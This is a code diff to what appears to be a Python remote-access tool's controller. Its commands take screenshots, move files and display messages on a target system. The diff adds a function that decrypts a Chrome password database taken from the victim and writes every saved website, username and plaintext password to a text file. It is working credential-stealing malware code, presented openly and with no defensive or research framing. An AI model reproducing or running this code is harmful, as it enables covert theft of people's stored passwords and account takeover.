@@ -13,6 +13,8 @@ import socket
 import os
 import sys
 import base64
+import sqlite3
+import win32crypt
 from colorama import init
 from colorama import Fore, Back, Style
 from time import *
@@ -114,14 +116,35 @@ def download(command):
 	        print bright + yellow + "[+] %s ==> %s\n"%(fileName, os.getcwd()+os.sep+fileName)
 	        f.close()
 	        break
-	        menu()
+
+def decrypt_db():
+    #https://github.com/D4Vinci/Chrome-Extractor/blob/master/Chromer.py
+    data="chrome_db"
+    connection = sqlite3.connect(data)
+    print bright + blue + "[>] Connected to data base.."
+    cursor = connection.cursor()
+    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+    final_data=cursor.fetchall()
+    print bright + blue + "[>] Found "+str(len(final_data))+" password.."
+    a=open("chrome.txt","w")
+    a.write("Extracted chrome passwords :\n")
+    for website_data in final_data:
+        password = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]
+        one="Website  : "+str(website_data[0])
+        two="Username : "+str(website_data[1])
+        three="Password : "+str(password)
+        a.write(one+"\n"+two+"\n"+three)
+        a.write("\n"+" == ==="*10+"\n")
+    print bright + blue + "[>] Decrypted "+str(len(final_data))+" passwords.."
+    print bright + blue + "[>] Data written to chrome.txt\n"
+    a.close()
 
 def help():
     print Fore.YELLOW + """
 Commands:
     help()                  : Show this message.
     screenshot()            : Take a screenshot on client and send image file to server.
-    chrome_db               : Download Chrome's password database.
+    chrome_db               : Download Chrome's password database and decrypt it.
     download                : Download files from client.
     upload                  : Upload files to client from server.
     message TEXT            : Show messages on target system.
@@ -171,12 +194,16 @@ def menu():
         elif command == "screenshot()":
             command = "screenshot() download %s.png"%(str(strftime("%Y-%m-%d~%H.%M.%S", gmtime())))
             download(command)
+            menu()
 
         elif "download" in command:
             download(command)
+            menu()
 
         elif command == "chrome_db":
             download("download chrome_db")
+            decrypt_db()
+            menu()
 
         elif command == "": 
             command = " "
